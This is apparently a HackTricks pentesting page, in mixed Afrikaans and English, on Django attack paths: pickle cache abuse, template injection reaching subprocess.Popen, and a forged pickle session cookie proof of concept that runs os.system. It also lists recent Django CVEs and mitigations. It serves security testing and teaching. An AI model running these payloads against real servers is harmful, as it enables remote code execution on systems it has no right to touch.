# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache-manipulasie na RCE
Django se standaard stoormetode vir cache is [Python pickles](https://docs.python.org/3/library/pickle.html), wat tot RCE kan lei as [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **As 'n attacker skriftoegang tot die cache kan kry, kan hulle hierdie kwesbaarheid eskaleer na RCE op die onderliggende bediener**.

Django cache word in een van vier plekke gestoor: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), of 'n [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache gestoor in 'n Redis-server of database is die waarskynlikste aanvalsvlakke (Redis injection en SQL injection), maar 'n attacker kan ook file-based cache gebruik om 'n arbitrary write in RCE om te skakel. Onderhouers het dit as 'n non-issue gemerk. Dit is belangrik om te let dat die cache-lêergids, SQL-tabelnaam en Redis-bedienerbesonderhede sal wissel volgens die implementering.

Hierdie HackerOne-verslag bied 'n uitstekende, reproduceerbare voorbeeld van die uitbuiting van Django cache wat in 'n SQLite database gestoor is: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Die Django Template Language (DTL) is **Turing-complete**. As gebruikersverskafte data as 'n *template string* gerender word (byvoorbeeld deur `Template(user_input).render()` aan te roep of wanneer `|safe`/`format_html()` auto-escaping verwyder), kan 'n attacker volle SSTI → RCE bereik.

### Detection
1. Soek na dinamiese oproepe na `Template()` / `Engine.from_string()` / `render_to_string()` wat *enige* ongesaniteerde versoekdata insluit.
2. Stuur 'n time-based of arithmetic payload:
```django
{{7*7}}
```
As die gerenderde uitset `49` bevat, is die invoer deur die template engine gecompileer.

### Primitive to RCE
Django blokkeer direkte toegang tot `__import__`, maar die Python object graph is bereikbaar:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Vind die indeks van `subprocess.Popen` (≈400–500 afhangende van die Python-build) en voer arbitraire opdragte uit:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
'n veiliger universele gadget is om te herhaal totdat `cls.__name__ == 'Popen'`.

Dieselfde gadget werk vir **Debug Toolbar** of **Django-CMS** template-rendering funksies wat gebruikersinvoer verkeerd hanteer.

---

### Also see: ReportLab/xhtml2pdf PDF export RCE
Aansoeke gebou op Django integreer gewoonlik xhtml2pdf/ReportLab om views as PDF uit te voer. Wanneer gebruikersbeheerde HTML in PDF-generering beland, kan rl_safe_eval uitdrukkings binne drievoudige hakies `[[[ ... ]]]` evalueer, wat kode-uitvoering moontlik maak (CVE-2023-33733). Besonderhede, payloads, en mitigasies:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
If the setting `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` is enabled (or a custom serializer that deserialises pickle), Django *decrypts and unpickles* the session cookie **before** calling any view code. Therefore, possessing a valid signing key (the project `SECRET_KEY` by default) is enough for immediate remote code execution.

### Exploit Requirements
* Die bediener gebruik `PickleSerializer`.
* Die attacker weet / kan raai `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Stuur die resulterende cookie, en die payload word uitgevoer met die permissies van die WSGI worker.

**Mitigasies**: Behou die standaard `JSONSerializer`, roteer `SECRET_KEY`, en konfigureer `SESSION_COOKIE_HTTPONLY`.

---

## Onlangse (2023-2025) Hoë-impak Django CVEs wat Pentesters moet nagaan
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (gefix 4 Jun 2025). Laat aanvallers toe om reëlbreuke/ANSI-kodes in loglêers in te smokkel en navolgende log-analise te vergiftig. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Skep JSON-sleutels om uit aanhaling te breek en arbitrêre SQL uit te voer. Reggestel in 4.2.15 / 5.0.8.

Vingerafdruk altyd die presiese framework-weergawe via die `X-Frame-Options` foutbladsy of die `/static/admin/css/base.css` hash en toets die bogenoemde waar van toepassing.

---

## Verwysings
* Django sekuriteitsvrystelling – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
